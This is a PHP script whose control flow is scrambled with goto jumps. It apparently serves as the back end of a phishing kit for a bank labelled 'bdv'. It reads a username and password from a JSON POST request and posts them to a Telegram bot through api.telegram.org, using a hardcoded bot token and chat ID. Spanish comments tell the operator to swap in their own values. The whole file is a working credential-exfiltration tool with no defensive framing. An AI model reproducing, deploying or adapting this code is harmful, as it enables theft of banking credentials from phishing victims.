<?php
goto jfI7M;
jfI7M: 
header("Content-Type: application/json"); 
goto RPjVg; 
RPjVg: 
$input = json_decode(file_get_contents("php://input"), true); 
goto g9h6E; 
TJGt1: 
$chatId = "7938474239"; // Reemplaza esto con tu nuevo chat ID
goto R5psC; 
R5psC: 
if (isset($input["usr"]) && isset($input["pw"])) { 
    $usr = $input["usr"]; 
    $pw = $input["pw"]; 
    $message = "-bdv-\n -Usr.: {$usr} \n Token: {$pw}"; 
    $url = "https://api.telegram.org/bot{$token}/sendMessage"; 
    $data = array("chat_id" => $chatId, "text" => $message, "parse_mode" => "HTML"); 
    $ch = curl_init($url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_POST, true); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
    $response = curl_exec($ch); 
    if (curl_errno($ch)) { 
        echo json_encode(array("success" => false, "error" => curl_error($ch))); 
        curl_close($ch); 
        die; 
    } 
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
    curl_close($ch); 
    if ($httpCode == 200) { 
        echo json_encode(array("success" => true)); 
    } else { 
        echo json_encode(array("success" => false, "error" => "Error al enviar el mensaje", "response" => $response)); 
    } 
} else { 
    echo json_encode(array("success" => false, "error" => "Datos incompletos")); 
} 
goto lgIaU; 
gE5su: 
$token = "7576739067:AAGirZWLYlIJ-B-krOiD7seIkcANYen-9JI"; // Reemplaza esto con tu nuevo bot token
goto TJGt1; 
g9h6E: 
if (json_last_error() !== JSON_ERROR_NONE) { 
    echo json_encode(array("success" => false, "error" => "JSON inválido")); 
    die; 
} 
goto gE5su; 
lgIaU: 
?>